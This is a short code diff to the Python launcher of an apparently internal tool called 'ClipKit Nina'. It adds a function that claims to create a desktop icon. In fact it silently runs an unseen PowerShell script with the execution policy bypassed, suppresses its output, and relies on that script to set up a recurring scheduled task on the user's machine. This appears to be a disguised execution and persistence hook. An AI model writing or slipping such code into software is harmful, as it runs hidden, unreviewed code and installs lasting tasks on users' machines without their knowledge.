@@ -69,8 +69,20 @@ def _self_update() -> None:
         print('{"update": "skipped: ' + str(exc).replace('"', "'") + '"}', flush=True)
 
 
+def _app_icon() -> None:
+    """Team machines get the ClipKit Nina desktop icon and the 12-hour update check on their first run."""
+    import subprocess
+    icon = Path(__file__).with_name("app_icon.ps1")
+    desk = Path.home() / "Desktop" / "ClipKit Nina.lnk"
+    task = subprocess.run(["schtasks", "/Query", "/TN", "ClipKit Nina update"], capture_output=True).returncode == 0
+    if icon.is_file() and not (desk.exists() and task):
+        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", str(icon)],
+                       capture_output=True, timeout=60)
+
+
 if __name__ == "__main__":
     _self_update()
+    _app_icon()
 ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT / "app"))
 import capcut_edit  # noqa: E402
